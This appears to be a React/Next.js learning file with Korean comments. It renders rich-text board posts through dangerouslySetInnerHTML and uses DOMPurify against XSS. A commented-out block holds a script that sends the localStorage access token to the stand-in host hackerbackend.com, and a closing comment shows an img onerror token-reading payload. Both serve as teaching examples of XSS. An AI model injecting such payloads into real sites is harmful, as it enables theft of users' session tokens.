import { useQuery, gql } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function EditorXssDetatilPage(): JSX.Element {
  const router = useRouter();

  console.log(router);
  // 1. router를 콘솔로 찍어보면 그 안에 query가 있고
  // 2. 주소창에 /뒤에 들어가는 내용이 그 query안에 저장이 됨
  // 3. 05/board/[qqq]이렇게 해두면 위의내용이 qqq로 들어가게 됨

  const { data } = useQuery(FETCH_BOARD, {
    variables: {
      boardId: router.query.qqq,
    },
  });

  /* 요렇게 해서 div dangerouslySetInnerHTML={myhtml로 바인딩해도 되지만
   * 바로 {{}} 이렇게 중괄호 두개 사용해서 연결
  const myhtml = {
    __html: data?.fetchBoard?.contents,
  }
 */

  return (
    <>
      <div>작성자: {data?.fetchBoard.writer}</div>
      <div>제목: {data?.fetchBoard.title}</div>
      {/* <div>내용: {data?.fetchBoard.contents}</div> */}
      {typeof window !== "undefined" && (
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard?.contents),
          }}
        />
      )}
      {/* <div
        dangerouslySetInnerHTML={{
          __html: `
            <script>
            const qqq = localStorage.getItem("accessToken")
            axios.post("http://hackerbackend.com/mydata", {data:qqq})
            </script>
          `
        }}
      /> */}
    </>
  );
}

/**
 * dangerouslySetInnerHTML={}
 * 현재 리액트퀼을 이용해서 내용을 넣는데 이거 없이 그냥
 * <div>내용: {data?.fetchBoard.contents}</div> 이렇게 넣게되면
 * 굵은 글씨같이 효과가 적용된것이 <b>이렇게 태그형태로 보여진다
 * 이 것을 html 그대로 보여지게 하기위해서 넣는것
 *
 * /////// XSS의 취약점 - 위험가능성
 * 만약 퀼에다가 일반 내용대신 위 처럼 script를 써서 엑세스토큰을 빼갈수도 있고
 * (기본적으로 퀼에서 <>이 표시가 &lt 이런걸로 변하게해서 막아주긴 하지만 아닌경우도 있으니)
 * 또 백엔드에 가서 createBoard에다 직접 contents로
 * contents: "<img src='#' onerror='console.log(localStorage.getItem(\"accessToken\"))' />
 * 이런식으로해서 정보를 탈취당할수도 있다
 *
 * 이런 것들을 방지하기 위해
 * npm에서 dompurify것들을 받아 사용할수있다 - ssr에서 프리랜더링 안됨 typeof 같은 조건 넣어줌
 */
